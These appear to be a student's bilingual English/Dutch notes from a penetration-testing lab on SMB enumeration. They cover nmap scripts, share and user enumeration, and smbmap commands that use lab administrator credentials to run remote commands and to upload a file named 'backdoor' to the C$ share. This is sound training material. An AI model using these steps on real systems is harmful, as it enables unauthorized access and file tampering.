

##### Servers & services 

Server:  it services something to a user, provides some sort of functionality that can be utilized by other devices. 
- We pull resources from servers (e.g. email/files). 
- Server can be runing windows, linux, macos. every computer can be a server 
- servers need to be accessed remotely 

Services (program on a computer that does a specific function) running on a server: 
- require poning a listening port on the server and accepting connections remotly. 
- open the barrier and allow access to programm remotely 
- problem: misconfig or bugs that can give remote access to whole system 


Examples of services that you would see on a server 

#### SMB 
- Windows file share implementation 
- CIFS (generic version) works the same as SMB 
- port 445 
- netbios sets up session for smb 
- SMB recon: 
-  Run an nmap scan for open ports ![[Pasted image 20230509105853.png]] Nmap ‘--open’ option would show only exposed ports of the live hosts
  
- Run scan for service enumeration on our OS 
![[Pasted image 20230509104119.png]]
- nmap {target ip} -sV -sC  (sC runs basic scripts) ![[Pasted image 20230509104300.png]]
   helpfull smb enumeration 
- net use in powershell for smb ![[Pasted image 20230509105010.png]]


SMB Discover and Mount 
- Objective: Learn to use Nmap to scan the target machine and mount the SMB share of the target machine using the Windows File Explorer as well as using the command prompt.  Objective: Discover SMB share and mount it
---
Lab SMB: 

1. ipconfig to get ip and check cidr 
2. Run Nmap scan against the subnet to discover the target machine’s IP address:  *nmap -T4 10.2.29.125/20 --open*

Nmap scan report for ip-10-2-16-110.eu-central-1.compute.internal (
Host is up (0.010s latency).
443/tcp open  https

Nmap scan report for ip-10-2-18-61.eu-central-1.compute.internal (1
Not shown: 991 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
**445/tcp   open  microsoft-ds**
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49165/tcp open  unknown
MAC Address: 02:A3:CA:EC:C9:AE (Unknown)

Nmap scan report for ip-10-2-19-34.eu-central-1.compute.internal (1
Host is up (0.0091s latency).
Not shown: 999 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-r
PORT    STATE SERVICE
443/tcp open  https
MAC Address: 02:8D:74:B4:D5:18 (Unknown)

Nmap scan report for ip-10-2-30-254.eu-central-1.compute.internal (
Host is up (0.0024s latency).
Not shown: 999 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-r
PORT    STATE SERVICE
443/tcp open  https
MAC Address: 02:EF:27:B5:9F:2A (Unknown)

Nmap scan report for ip-10-2-29-125.eu-central-1.compute.internal (
Host is up (0.00s latency).
Not shown: 990 closed ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
**445/tcp  open  microsoft-ds**
1025/tcp open  NFS-or-IIS
1026/tcp open  LSA-or-nterm
1027/tcp open  IIS
1028/tcp open  unknown
1037/tcp open  ams
1050/tcp open  java-or-OTGfileshare
3389/tcp open  ms-wbt-server 

---

**nmap 10.2.18.61 -sV -O**

Nmap scan report for ip-10-2-18-61.eu-central-1.compute.inter

PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-
**445/tcp   open  microsoft-ds       Microsoft Windows Server 2**
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49165/tcp open  msrpc              Microsoft Windows RPC

Network Distance: 1 hop
Service Info: OSs: **Windows, Windows Server 2008 R2 - 2012**; CP

OS and Service detection performed. Please report any incorre
Nmap done: 1 IP address (1 host up) scanned in 78.05 seconds


---

 **nmap 10.2.18.61 -sV -sC**
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows Server 2012 R2 Standard 9600 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49165/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 02:A3:CA:EC:C9:AE (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:window

Host script results:
nbstat: NetBIOS name: WIN-OMCNBKR66MN, NetBIOS user: NetBIOS MAC: 02:a3:ca

smb-os-discovery: 
smb-security-mode: 
smb2-security-mode:


##### SMB: Nmap scripts

- Once you establish the existence of the smb server now we procede with enumeration which invovles finding more info about the service (what can we learn from it and what can we do with it)
- nmap has an scripting engine (see documentation of nmap)
	- to use scripts we use: *--script {scriptname}*
- stappenplan: 

1. ping target ip to check connection  
   
2.  run an nmap scan:  *nmap {target ip}*
   
3. check if it has smb (port 445 is open)
   
4. run an nmap scan just on the smb port 445 where we look at the smb protocol: *nmap -p445 --script smb-protocols {target ip}*
   
5. run an nmap scan just on smb port 445 where we check the securty mode: *nmap -p445 --script smb-security-mode {target ip}*
   
6. run an nmap scan where we enumerate a session: *nmap -p445 --script smb-enum-sessions {target ip}*
	- smb-eum-sessions: geeft Nmap opdracht om het script smb-enum-sessions uit te voeren, wat informatie over actieve sessies in het SMB-protocol kan opleveren
	  
7. run the following nmap: *nmap -p445 --script smb-enum-sessions --script-args* *smbusername={adminstrator}, smbpassword={smbserver_771} {target ip}*
	 - script-args: geeft argumenten door aan het smb-enum-sessions script, die specifiek zijn voor dat script. 
	   
8. run the following nmap command to enumerate the shares: *nmap -p445 --script smb-enum-shares {target ip}* 
	- gebruikt om de gedeelde bronnen te identificeren die beschikbaar zijn op een bepaalde host die SMB gebruikt op poort 445. SMB is een protocol dat wordt gebruikt voor het delen van bestanden en printers tussen computers op een netwerk
	- .![[Pasted image 20230510145104.png]]
	- ipc$ is usefull because it is a null session (anonymous session) where you can get in as a **guest** account but also utilize this session: IPC$ is een speciale gedeelde bron op computers die het SMB-protocol gebruiken. Het is een null sessie, wat betekent dat er geen inloggegevens vereist zijn om toegang te krijgen tot deze gedeelde bron. Het kan worden gebruikt door geautoriseerde gebruikers om verbinding te maken met het bestandssysteem en printers van de computer via het netwerk, zonder dat ze een geldige inlognaam of wachtwoord nodig hebben.  mogelijk is dat kwaadwillende gebruikers deze null sessie gebruiken om ongeautoriseerde toegang te krijgen tot de bronnen van een computer.
	  
9. Now run a command where we enumerate the shares after authenticating: *nmap -p445  --script smb-enum-shares --script-args smbusername=administrator, smbpaswordsmbserver_771 {target ip}*
   
10. now enumerate the users to find out which users exist: *nmap -p445 --script smb-enum-users 
     -script-args smbusername=administrator smbpasword=smbserver_771 {target ip}* ![[Pasted image 20230510150118.png]]
     (bult in accounts for guests en password does not expire = misconfiguration). De gastaccount is een ingebouwde account in Windows-besturingssystemen en is bedoeld voor gebruikers die de computer of het netwerk bezoeken zonder geldige inloggegevens te hebben. De account biedt beperkte toegang tot bepaalde bronnen, zoals bestanden en printers, en heeft geen wachtwoord nodig om toegang te krijgen
     
 11. run a command to look at server statistic: *nmap -p445 --script smb-server-stats --script-arg smbusersname=administrator, smbpassword=smbserver_771 {target ip}*
     
 13. run command to check what domains exist: *nmap -p445 -script smb-enum-domains -s-cript-args smbusername=administrator, smbpassword=smbserver_771 {target ip}*
     
 14. run command to check groups: *nmap -p445 --script smb-enum-groups --script-arg smbusername=adminsitrator, smbpassword=smbserver_771 {ip}* 
     
 15. run command to check what services are running: *nmap -p445 --script smb-enum-services      --script-arg smbusername=adminsitrator, smbpassword=smbserver_771 {ip}*  

		In dit geval verwijst 'services' naar de services of diensten die op de doelhost draaien en die worden aangeboden via het SMB (Server Message Block)-protocol op poort 445. Met de Nmap-opdracht wordt de script "smb-enum-services" gebruikt om informatie te verkrijgen over de services die op deze poort worden aangeboden, inclusief hun namen, statussen, types en de besturingselementen die ze accepteren. Deze informatie kan nuttig zijn voor beveiligingsdoeleinden, omdat het kan helpen bij he


 16. run command to see what shares exist but also enumerate those shares: *nmap -p445 --script smb-enum-shares,smb-ls      --script-arg smbusername=adminsitrator, smbpassword=smbserver_771 {ip}*   
	 - De opties "--script smb-enum-shares, smb-ls" specificeren dat twee scripts moeten worden uitgevoerd tijdens de scan: "smb-enum-shares" voor het vinden van gedeelde mappen en "smb-ls" voor het oplijsten van de inhoud van de gevonden mappen.
	 - -   `smb-enum-shares`: This script will enumerate all the SMB shares on the target system.
	-   `smb-ls`: This script will run the `ls` command on each share. Note that the `smb-ls` script requires authentication credentials for the target system. You can provide the credentials using the `smbusername` and `smbpassword` script arguments. For example:
	

-- LAB -- 

Target ip: 10.2.26.153 
**Objective:**

1.  Identify SMB Protocol Dialects

root@attackdefense:~# nmap -p445 --script smb-protocols 10.2.26.153
Nmap scan report for 10.2.26.153

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.02
|     2.10
|     3.00
|_    3.02


2. .  Find SMB security level information


root@attackdefense:~# nmap -p445 --script smb-security-mode 10.2.26.153
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)


-   account_used: guest: dit betekent dat de gastaccount wordt gebruikt voor de SMB-sessie. Dit is een veel voorkomende zwakte in de beveiliging, omdat de gastaccount vaak is ingeschakeld en mogelijk zwakke referenties heeft of helemaal geen wachtwoord.
    
-   authentication_level: user: dit betekent dat een wachtwoord vereist is om toegang te krijgen tot de SMB-sessie, wat een hoger beveiligingsniveau impliceert dan de "geen" of "gast" -modi.
    
-   challenge_response: ondersteund: dit betekent dat het challenge-response-authenticatiemechanisme wordt ondersteund. Dit is een protocol dat wordt gebruikt om de identiteit van een gebruiker te verifiëren zonder het wachtwoord zelf te verzenden.
    
-   message_signing: disabled (gevaarlijk, maar standaard): dit betekent dat SMB-berichtondertekening is uitgeschakeld.   Ondertekening van berichten is een beveiligingsfunctie die ervoor zorgt dat berichten niet kunnen worden gewijzigd terwijl ze in transit zijn. Wanneer het is uitgeschakeld, kunnen aanvallers verkeer tussen de client en de server manipuleren en in sommige gevallen vertrouwelijke gegevens stelen of beschadigen.

3. .  Enumerate active sessions, shares, Windows users, domains, services, etc.


**Active sessions:** 

root@attackdefense:~# nmap -p445 --script smb-enum-sessions 10.2.26.153
Starting Nmap 7.91 ( https://nmap.org ) at 2023-05-10 19:44 IST
Nmap scan report for 10.2.26.153
Host is up (0.0031s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-sessions: 
|   Users logged in
|_    WIN-OMCNBKR66MN\bob since 

-> The output indicates that there is one user, "bob," who is currently logged in to the SMB server from a Windows machine with the hostname "WIN-OMCNBKR66MN". The time at which the user logged in is unknown or not reported.


**shares**: 

root@attackdefense:~# nmap -p445 --script smb-enum-shares 10.2.26.153

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.2.26.153\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: none
|     Current user access: none

|   \\10.2.26.153\C: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: none
|     Current user access: READ

|   \\10.2.26.153\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: none
|     Current user access: none

|   \\10.2.26.153\D$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: none
|     Current user access: none

|   \\10.2.26.153\Documents: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: none
|     Current user access: READ

|   \\10.2.26.153\Downloads: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: none
|     Current user access: READ

|   \\10.2.26.153\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: none
|     Current user access: READ/WRITE

 lijst van SMB-shares getoond die toegankelijk zijn via het IP-adres 10.2.26.153. De lijst bevat de volgende informatie over elke share:

-   Type: het type van de share (bijvoorbeeld STYPE_DISKTREE voor een share die een map op de schijf voorstelt)
-   Comment: een commentaar die de eigenaar van de share heeft toegevoegd
-   Anonymous access: of anonieme toegang mogelijk is voor deze share , je moet bij none authenticaten voor je de share kan bereiken 
-   Current user access: welke toegangsniveaus momenteel beschikbaar zijn voor de ingelogde gebruiker

In dit geval zijn er verschillende shares beschikbaar, waaronder ADMIN$, C:, C$, D:, Documents, Downloads en IPC$. De toegangsniveaus voor elke share variëren afhankelijk van de gebruiker en zijn ingesteld op "READ", "READ/WRITE" of "none".

Het verschil tussen `STYPE_DISKTREE` en `STYPE_DISKTREE_HIDDEN` is dat `STYPE_DISKTREE` aangeeft dat de share publiekelijk zichtbaar is voor alle gebruikers op het netwerk, terwijl `STYPE_DISKTREE_HIDDEN` aangeeft dat de share verborgen is voor gebruikers die de naam van de share niet kennen. Dit betekent dat gebruikers die proberen toegang te krijgen tot een verborgen share deze alleen kunnen bereiken als ze de exacte naam van de share weten, terwijl gebruikers toegang kunnen krijgen tot een publieke share door simpelweg te browsen door het netwerk. Dit kan een extra beveiligingslaag bieden voor gevoelige gegevens of toepassingen die niet publiekelijk toegankelijk moeten zijn.

**Windows users** 

root@attackdefense:~# nmap -p445 --script smb-enum-users -script-args smbusername=administrator,smbpassword=smbserver_771 10.2.26.153

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-users: 
|   WIN-OMCNBKR66MN\Administrator (RID: 500)
|     Description: Built-in account for administering the computer/domain
|     Flags:       Password does not expire, Normal user account
|   WIN-OMCNBKR66MN\bob (RID: 1010)
|     Flags:       Password does not expire, Normal user account
|   WIN-OMCNBKR66MN\Guest (RID: 501)
|     Description: Built-in account for guest access to the computer/domain
|_    Flags:       Password not required, Password does not expire, Normal user account





**Domains** 


root@attackdefense:~# nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771  10.2.24.168

Nmap scan report for 10.2.24.168


PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-domains: 
|   WIN-OMCNBKR66MN
|     Groups: WinRMRemoteWMIUsers__
|     Users: Administrator, bob, Guest
|     Creation time: 2013-08-22T14:47:57
|     Passwords: min length: n/a; min age: n/a days; max age: 42 days; history: n/a passwords
|     Properties: Complexity requirements exist
|     Account lockout disabled
|   Builtin
|     Groups: Access Control Assistance Operators, Administrators, Backup Operators, Certificate Service DCOM Access, Cryptographic Operators, Distributed COM Users, Event Log Readers, Guests, Hyper-V Administrators, IIS_IUSRS, Network Configuration Operators, Performance Log Users, Performance Monitor Users, Power Users, Print Operators, RDS Endpoint Servers, RDS Management Servers, RDS Remote Access Servers, Remote Desktop Users, Remote Management Users, Replicator, Users
|     Users: n/a
|     Creation time: 2013-08-22T14:47:57
|     Passwords: min length: n/a; min age: n/a days; max age: 42 days; history: n/a passwords
|_    Account lockout disabled

-   Two domains are listed in the output: `WIN-OMCNBKR66MN` and `Builtin`.
-   The `WIN-OMCNBKR66MN` domain is shown to have a group called `WinRMRemoteWMIUsers__` and three users: `Administrator`, `bob`, and `Guest`.
-   The domain creation time is also shown, along with information about password policies, account lockout settings, and other properties.
-   The `Builtin` domain is shown to have several built-in groups and no users.
-   Again, the domain creation time is shown along with password policies and account lockout settings.

**Services**: 

root@attackdefense:~# nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771  10.2.24.168

Nmap scan report for 10.2.24.168
Host is up (0.0025s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
| smb-enum-services: 
|   AmazonSSMAgent: 
|     display_name: Amazon SSM Agent
|     state: 
|       SERVICE_PAUSED
|       SERVICE_PAUSE_PENDING
|       SERVICE_RUNNING
|       SERVICE_CONTINUE_PENDING
|     type: 
|       SERVICE_TYPE_WIN32
|       SERVICE_TYPE_WIN32_OWN_PROCESS
|     controls_accepted: 
|       SERVICE_CONTROL_NETBINDADD
|       SERVICE_CONTROL_CONTINUE
|       SERVICE_CONTROL_PARAMCHANGE
|       SERVICE_CONTROL_STOP
|       SERVICE_CONTROL_NETBINDENABLE
|       SERVICE_CONTROL_INTERROGATE
|   AWSLiteAgent: 
|     display_name: AWS Lite Guest Agent
|     state: 
|       SERVICE_PAUSED
|       SERVICE_PAUSE_PENDING
|       SERVICE_RUNNING
|       SERVICE_CONTINUE_PENDING
|     type: 
|       SERVICE_TYPE_WIN32
|       SERVICE_TYPE_WIN32_OWN_PROCESS
|     controls_accepted: 
|       SERVICE_CONTROL_NETBINDADD
|       SERVICE_CONTROL_CONTINUE
|       SERVICE_CONTROL_PARAMCHANGE
|       SERVICE_CONTROL_STOP
|       SERVICE_CONTROL_NETBINDENABLE
|       SERVICE_CONTROL_INTERROGATE
|   DiagTrack: 
|     display_name: Diagnostics Tracking Service
|     state: 
|       SERVICE_PAUSED
|       SERVICE_PAUSE_PENDING
|       SERVICE_RUNNING
|       SERVICE_CONTINUE_PENDING
|     type: 
|       SERVICE_TYPE_WIN32
|       SERVICE_TYPE_WIN32_OWN_PROCESS
|     controls_accepted: 
|       SERVICE_CONTROL_NETBINDADD
|       SERVICE_CONTROL_CONTINUE
|       SERVICE_CONTROL_PARAMCHANGE
|       SERVICE_CONTROL_STOP
|       SERVICE_CONTROL_NETBINDENABLE
|       SERVICE_CONTROL_INTERROGATE
|   Ec2Config: 
|     display_name: Ec2Config
|     state: 
|       SERVICE_PAUSED
|       SERVICE_PAUSE_PENDING
|       SERVICE_RUNNING
|       SERVICE_CONTINUE_PENDING
|     type: 
|       SERVICE_TYPE_WIN32
|       SERVICE_TYPE_WIN32_OWN_PROCESS
|     controls_accepted: 
|       SERVICE_CONTROL_NETBINDADD
|       SERVICE_CONTROL_CONTINUE
|       SERVICE_CONTROL_PARAMCHANGE
|       SERVICE_CONTROL_STOP
|       SERVICE_CONTROL_NETBINDENABLE
|       SERVICE_CONTROL_INTERROGATE
|   MSDTC: 
|     display_name: Distributed Transaction Coordinator
|     state: 
|       SERVICE_PAUSED
|       SERVICE_PAUSE_PENDING
|       SERVICE_RUNNING
|       SERVICE_CONTINUE_PENDING
|     type: 
|       SERVICE_TYPE_WIN32
|       SERVICE_TYPE_WIN32_OWN_PROCESS
|     controls_accepted: 
|       SERVICE_CONTROL_NETBINDADD
|       SERVICE_CONTROL_CONTINUE
|       SERVICE_CONTROL_PARAMCHANGE
|       SERVICE_CONTROL_STOP
|       SERVICE_CONTROL_NETBINDENABLE
|       SERVICE_CONTROL_INTERROGATE
|   Spooler: 
|     display_name: Print Spooler
|     state: 
|       SERVICE_PAUSED
|       SERVICE_PAUSE_PENDING
|       SERVICE_RUNNING
|       SERVICE_CONTINUE_PENDING
|     type: 
|       SERVICE_TYPE_WIN32
|       SERVICE_TYPE_WIN32_OWN_PROCESS
|     controls_accepted: 
|       SERVICE_CONTROL_NETBINDADD
|       SERVICE_CONTROL_CONTINUE
|       SERVICE_CONTROL_STOP
|_      SERVICE_CONTROL_NETBINDENABLE


-   The smb-enum-services script output is then displayed, showing a list of services running on the target system that were discovered during the scan.
-   For each service discovered, the script shows the following information:
    -   The display name of the service (e.g., Amazon SSM Agent, AWS Lite Guest Agent, etc.).
    -   The current state of the service, which can be one of SERVICE_PAUSED, SERVICE_PAUSE_PENDING, SERVICE_RUNNING, or SERVICE_CONTINUE_PENDING.
    -   The type of the service, which can be one of SERVICE_TYPE_WIN32 or SERVICE_TYPE_WIN32_OWN_PROCESS.
    -   The controls that the service accepts, which can include SERVICE_CONTROL_NETBINDADD, SERVICE_CONTROL_CONTINUE, SERVICE_CONTROL_PARAMCHANGE, SERVICE_CONTROL_STOP, SERVICE_CONTROL_NETBINDENABLE, and SERVICE_CONTROL_INTERROGATE.

Based on this output, we can see that there are several services running on the target system, including the Amazon SSM Agent, AWS Lite Guest Agent, Diagnostics Tracking Service, Ec2Config, Distributed Transaction Coordinator, and Print Spooler. This information can be useful for further enumeration or exploitation of the target system.

-   **Current state of the service**: This shows the current state of the service, which can be one of the following:
    
    -   SERVICE_PAUSED: The service is currently paused.
    -   SERVICE_PAUSE_PENDING: The service is in the process of pausing.
    -   SERVICE_RUNNING: The service is currently running.
    -   SERVICE_CONTINUE_PENDING: The service is in the process of continuing.
-   **Type of the service**: This shows the type of the service, which can be one of the following:
    
    -   SERVICE_TYPE_WIN32: The service runs in a shared process.
    -   SERVICE_TYPE_WIN32_OWN_PROCESS: The service runs in its own process.
-   **Controls that the service accepts**: This shows the controls that the service accepts, which can include the following:
    
    -   SERVICE_CONTROL_NETBINDADD: The service can bind to new network addresses.
    -   SERVICE_CONTROL_CONTINUE: The service can continue from a paused state.
    -   SERVICE_CONTROL_PARAMCHANGE: The service can receive notifications of parameter changes.
    -   SERVICE_CONTROL_STOP: The service can be stopped.
    -   SERVICE_CONTROL_NETBINDENABLE: The service can bind to all network addresses.
    -   SERVICE_CONTROL_INTERROGATE: The service can receive status requests.


##### SMB: SMBMap 

1. ping the target ip to check if it is alive 
   
2. run an nmap scan: *nmap {target ip}*
   
3. run an script voor smb protocols: *nmap -p445 --script smb-protocols {targetip}*  this will tell us the procols and dialects. When we spot dialect SMBv1 which is dangerous we will use smbmap
   
4. Als je ziet dat versie 1 van smb gebruikt wordt dan gaan we een nullsession starten met volgende command: run smbmap voor smbv1: *smbmap -u guest -p "" -d . -H {target ip}* 
	- -   `-u guest`: gebruikt de gebruikersnaam "guest" om verbinding te maken met de host.
	-   `-p ""`: stelt het wachtwoord in op een lege string, wat betekent dat er geen wachtwoord wordt gebruikt om verbinding te maken met de host.
	-   `-d .`: stelt de domeinnaam in op "." (de huidige domeinnaam).
	-   `-H {target ip}`: specificeert het IP-adres van de doel-SMB-host waarmee verbinding moet worden gemaakt.
	- The results will be shares that the guest is able to connect to 
	
5. Try to run a command: *smbmap -H {taget ip} -u administrator -p smbserver_771 -x 'ipconfig'*
	- De optie `-x` wordt gebruikt om een opdracht uit te voeren op de SMB-host nadat er verbinding is gemaakt. In dit geval wordt de opdracht 'ipconfig' uitgevoerd, die de netwerkconfiguratie van de host weergeeft.
	  
6. run a command to see a list of drives and folders     : *smbmap -H {taget ip} -u administrator -p 'smbserver_771' -L *
	- Door dit commando uit te voeren, krijg je een lijst van gedeelde mappen te zien die beschikbaar zijn op de opgegeven SMB-server met behulp van de opgegeven inloggegevens. 
	-   -L: Deze optie instrueert smbmap om een lijst van gedeelde mappen op de SMB-server weer te geven.

7. if there is a C$ we will try to connect with it using the following command:   *smbmap -H {taget ip} -u Administrator -p 'smbserver_771' -r 'C$'*
	- Door dit commando uit te voeren, maak je verbinding met de opgegeven SMB-server met de opgegeven inloggegevens en krijg je toegang tot de inhoud van de 'C$' gedeelde map, waarbij je informatie kunt zien over de bestanden en mappen die zich op de systeemschijf van de SMB-server bevinden.
	- -r 'C$ Deze optie geeft aan dat je toegang wilt krijgen tot de gedeelde map C$ op de SMB-server. 'C$' is een verborgen gedeelde map op Windows-systemen die meestal verwijst naar de systeemschijf (meestal de C-schijf)
	  
8. Lets try the following: 
	1. create a file called backdoor: *touch backdoor*  check with ls to see if the file exist 
	2.  run the following command: *smbmap -H {taget ip} -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor'* 
			--upload '/root/backdoor' C$ backdoor: This option is used to upload a file from the local machine to the remote server. It specifies the source file path (`/root/backdoor`) on the local machine and the destination file path (`C$\backdoor`) on the remote server. In this example, it is attempting to upload the file located at `/root/backdoor` to the `C:\backdoor` path on the remote server.
	3. Now check if you successfully uploaded the file: *smbmap -H {taget ip} -u Administrator -p 'smbserver_771' -r 'C$'*
		 - `-r 'C$'` specifies the share name to be enumerated, in this case, the "C$" administrative share.  ![[Pasted image 20230512152628.png]]
		 - If sucessfull then that means that you can upload a file. 
		4. Check if you can download a file: *smbmap -H {taget ip} -u Administrator -p 'smbserver_771' --download 'C$\{filename.extention}'* 
		5. ls to see if download is complete 
		6. read the file: *cat filename

----------------- 

LAB Windows recon: SMBMap   (deze nog een keer doen )

Your task is to fingerprint the service using the tools available on the Kali machine and run the smbmap tool to enumerate the target machine service.

**Objective:** Enumerate the target machine SMB service using the smbmap tool and discover the flag.

*Target IP:*: 10.2.17.126
*My machine ip*: eth0: 10.1.0.12/16      -      eth1: 10.10.24.6/24


Stappenplan SMBMap: 

1.  Ping the target IP to check if it is alive. 
	   Target is live ✔

   
   
2.  Run an nmap scan: `nmap {target ip}`. ✔
   
		root@attackdefense:~# nmap 10.2.17.126
		PORT      STATE SERVICE
		135/tcp   open  msrpc
		139/tcp   open  netbios-ssn
		445/tcp   open  microsoft-ds  📍
		3389/tcp  open  ms-wbt-server
		49152/tcp open  unknown
		49153/tcp open  unknown
		49154/tcp open  unknown
		49155/tcp open  unknown
		49165/tcp open  unknown

   
   
   
3.  Run a script for SMB protocols: `nmap -p445 --script smb-protocols {target ip}`.
   
		root@attackdefense:~# nmap -p445 --script smb-protocols 10.2.17.126
		PORT    STATE SERVICE
		445/tcp open  microsoft-ds
		Host script results:
		| smb-protocols: 
		|   dialects: 
		|     NT LM 0.12 (SMBv1) [dangerous, but default]
		|     2.02
		|     2.10
		|     3.00
		|_    3.02

   ![[Pasted image 20230515161029.png]]
   ![[Pasted image 20230515161051.png]]
4.  Run smbmap for SMBv1: `smbmap -u guest -p "" -d . -H {target ip}`.
   
		root@attackdefense:~# smbmap -u Guest -p "" -d . -H 10.2.17.126
		[+] Guest session   	IP: 10.2.17.126:445	Name: 10.2.17.126                                       
		Disk                                                  	Permissions	Comment
			----                                                -----------	-------
			ADMIN$                                            	NO ACCESS	Remote Admin
			C                                                 	NO ACCESS	
			C$                                                	NO ACCESS	Default share
			D$                                                	NO ACCESS	Default share
			Documents                                         	NO ACCESS	
			Downloads                                         	NO ACCESS	
			IPC$                                              	READ ONLY	Remote IPC
			print$                                            	READ ONLY	Printer Drivers

   
   
   
5.  Try to run a command: `smbmap -H {target ip} -u administrator -p smbserver_771 -x 'ipconfig'`.
   
		root@attackdefense:~# smbmap -H 10.2.17.126 -u administrator -p smbserver_771 -x 'ipconfig'
		Windows IP Configuration
		Ethernet adapter Ethernet 2:
		
		   Connection-specific DNS Suffix  . : eu-central-1.compute.internal
		   Link-local IPv6 Address . . . . . : fe80::b935:90b1:9bc5:2b43%12
		   IPv4 Address. . . . . . . . . . . : 10.2.17.126
		   Subnet Mask . . . . . . . . . . . : 255.255.240.0
		   Default Gateway . . . . . . . . . : 10.2.16.1
		
		Tunnel adapter isatap.eu-central-1.compute.internal:
		   Media State . . . . . . . . . . . : Media disconnected
		   Connection-specific DNS Suffix  . : eu-central-1.compute.intern
		   
   
   
6.  Run a command to see a list of drives and folders: `smbmap -H {target ip} -u administrator -p 'smbserver_771' -L`.
   
		root@attackdefense:~# smbmap -H 10.2.17.126 -u administrator -p 'smbserver_771' -L
		[+] Host 10.2.17.126 Local Drives: C:\ D:\ 📍
		[+] Host 10.2.17.126 Net Drive(s):
			No mapped network drives

   
   
   
   
   
7.  If there is a C$ share, try to connect with it using the following command: `smbmap -H {target ip} -u Administrator -p 'smbserver_771' -r 'C$'`.
   
		   root@attackdefense:~# smbmap -H 10.2.17.126 -u administrator -p 'smbserver_771' -r 'C$' 
			IP: 10.2.17.126:445	Name: 10.2.17.126                                       
		Disk                                                  	Permissions	Comment
			----                                                 -----------	-------
			C$                                                	READ, WRITE	
			.\C$\*
			dr--r--r--                0 Sat Sep  5 13:26:00 2020	$Recycle.Bin
			fw--w--w--           398356 Wed Aug 12 10:47:41 2020	bootmgr
			fr--r--r--                1 Wed Aug 12 10:47:40 2020	BOOTNXT
			dr--r--r--                0 Wed Aug 12 10:47:41 2020	Documents and Settings
			fr--r--r--               32 Mon Dec 21 21:27:10 2020	flag.txt 📍
			fr--r--r--       8589934592 Mon May 15 16:49:40 2023	pagefile.sys
			dr--r--r--                0 Wed Aug 12 10:49:32 2020	PerfLogs
			dw--w--w--                0 Wed Aug 12 10:49:32 2020	Program Files
			dr--r--r--                0 Sat Sep  5 14:35:45 2020	Program Files (x86)
			dr--r--r--                0 Sat Sep  5 14:35:45 2020	ProgramData
			dr--r--r--                0 Sat Sep  5 09:16:57 2020	System Volume Information
			dw--w--w--                0 Sat Dec 19 11:14:55 2020	Users
			dr--r--r--                0 Sat Dec 19 11:26:46 2020	Windows

   
   
   
   
8.  Let's try the following:
    -   Create a file called backdoor: `touch backdoor` and check with `ls` to see if the file exists.
    -   Run the following command to upload the file: `smbmap -H {target ip} -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor'`.
    -   Check if the file was successfully uploaded: `smbmap -H {target ip} -u Administrator -p 'smbserver_771' -r 'C$'`.
    -   Check if you can download a file: `smbmap -H {target ip} -u Administrator -p 'smbserver_771' --download 'C$\{filename.extension}'`.
    -   Use `ls` to see if the download is complete.
    -   Read the file: `cat filename`. 

			
			root@attackdefense:~# smbmap -H 10.2.17.126 -u administrator -p 'smbserver_771' -r 'C$' 
			[+] IP: 10.2.17.126:445	Name: 10.2.17.126                                       
			        Disk                                                  	Permissions	Comment
				----                                                  	-----------	-------
				C$                                                	READ, WRITE	
				.\C$\*
				dr--r--r--                0 Sat Sep  5 13:26:00 2020	$Recycle.Bin
				fr--r--r--                0 Mon May 15 17:27:19 2023	backdoor
				fw--w--w--           398356 Wed Aug 12 10:47:41 2020	bootmgr
				fr--r--r--                1 Wed Aug 12 10:47:40 2020	BOOTNXT
				dr--r--r--                0 Wed Aug 12 10:47:41 2020	Documents and Settings
				fr--r--r--               32 Mon Dec 21 21:27:10 2020	flag.txt
